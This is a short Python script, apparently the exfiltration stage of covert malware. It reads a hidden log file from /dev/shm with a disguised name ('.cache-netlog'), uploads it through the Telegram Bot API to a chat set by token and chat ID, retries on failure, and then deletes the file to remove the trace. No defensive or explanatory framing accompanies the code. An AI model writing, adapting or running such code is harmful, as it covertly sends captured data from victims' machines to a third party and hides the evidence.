import requests
import time

BOT_TOKEN = "" #BOT TOKEN
CHAT_ID = "" #CHAT ID
MESSAGE_FILE = "/dev/shm/.cache-netlog"
MAX_RETRIES = 5

for attempt in range(MAX_RETRIES):
    try:
        with open(MESSAGE_FILE, 'rb') as f:
            response = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                data={"chat_id": CHAT_ID},
                files={"document": f}
            )

        if response.status_code == 200:
            break  #Successfully sent

    except requests.ConnectionError:
        time.sleep(2)

try:
    import os
    os.remove(MESSAGE_FILE)
except Exception:
    pass
